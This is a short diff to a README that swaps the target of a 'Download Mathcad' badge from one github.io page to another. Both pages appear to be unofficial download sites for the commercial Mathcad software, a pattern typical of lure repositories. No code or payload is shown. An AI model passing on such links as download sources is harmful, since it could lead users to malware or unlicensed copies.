@@ -2,7 +2,8 @@
 
 ## 📥 Download Mathcad
 
-[![⬇️ Download Mathcad](https://img.shields.io/badge/Download-Mathcad-blue?style=for-the-badge&logo=windows)](https://mathcad-engineering-download.github.io/.github)
+[![⬇️ Download Mathcad](https://img.shields.io/badge/Download-Mathcad-blue?style=for-the-badge&logo=windows)](https://mathcad-engineering-calculation.github.io/.github
+)
 
 ---
 
